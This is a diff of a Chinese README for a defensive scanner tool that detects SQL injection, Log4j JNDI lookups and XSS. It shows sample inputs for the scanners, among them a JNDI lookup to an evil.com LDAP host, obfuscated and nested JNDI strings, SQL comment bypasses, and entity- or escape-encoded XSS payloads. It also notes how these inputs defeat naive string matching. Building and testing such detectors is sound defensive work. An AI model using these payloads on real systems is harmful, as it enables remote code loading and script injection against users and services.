@@ -34,27 +34,6 @@ make -j        # 编译，产物在 build/ragel/
 make test      # 跑测试
 ```
 
-跑单条输入看看结果：
-
-```bash
-# 普通样本
-./build/ragel/sqli_scan        '1=1 OR 1=2'
-./build/ragel/log4j_scan       '${jndi:ldap://evil.com/a}'
-./build/ragel/html5_xss_scan   '<img onerror=alert(1)>'
-
-# 嵌套样本：括号 / ${} 套了好几层
-./build/ragel/sqli_scan        '(SELECT * FROM (SELECT 1))'
-./build/ragel/log4j_scan       '${lower:${jndi:ldap://x/y}}'
-./build/ragel/html5_xss_scan   '<img onerror=window["constructor"]["constructor"]("alert(1)")()>'
-
-# 绕过样本：注释、编码、拆词拼接
-./build/ragel/sqli_scan        '1=1/**/OR/**/1=2'
-./build/ragel/log4j_scan       '${jn${lower:d}i:ldap://x/a}'
-./build/ragel/html5_xss_scan   '<img src=x onerror="al&#101;rt(1)">'
-```
-
-最后一组考验的是"能不能看懂内容"：SQL 里 `/**/` 是注释要跳过去、`&#101;` 解出来就是字母 `e`（`al` + `e` + `rt` 拼回 `alert`）、`${lower:d}` 归约成 `d`。只照着字符串硬比对的话，这三条都拦不住。
-
 输出会先打印切出来的词，再打印命中的规则：`sqli_scan` 和 `html5_xss_scan` 的行首是 `!!`，`log4j_scan` 是 `[JNDI]` 这样的分类标签。`make test` 输出的是 `[PASS]` / `[FAIL]` 加最后一行总结。
 
 不想用 make 也可以用 cmake：
@@ -78,6 +57,19 @@ cmake --build build --target validate_ragel
 ```
 
 `1=1` 报、`1=2` 不报——两边值相等是算出来的（`sql_const_numbers_equal`），不是正则；`SLEEP(5)` 报、`sleeping(5)` 不报——函数名是精确比对（`$is_sleep`），不是前缀匹配。
+
+## XSS 的语义分析
+
+`html5_xss_scan` 会看穿属性值和脚本里的 JS：
+
+```bash
+./build/ragel/html5_xss_scan '<img onerror=alert(1)>'                      # black_attr + dangerous_js
+./build/ragel/html5_xss_scan '<img src=x onerror="al&#101;rt(1)">'         # &#101; 还原成 e
+./build/ragel/html5_xss_scan '<script>\u0061lert(1)</script>'              # \u0061 还原成 a
+./build/ragel/html5_xss_scan '<script>window["eval"]("alert(1)")</script>' # eval 藏在字符串里
+```
+
+危险名藏在实体、转义、字符串里，先还原再比黑名单。
 
 ## 目录
 
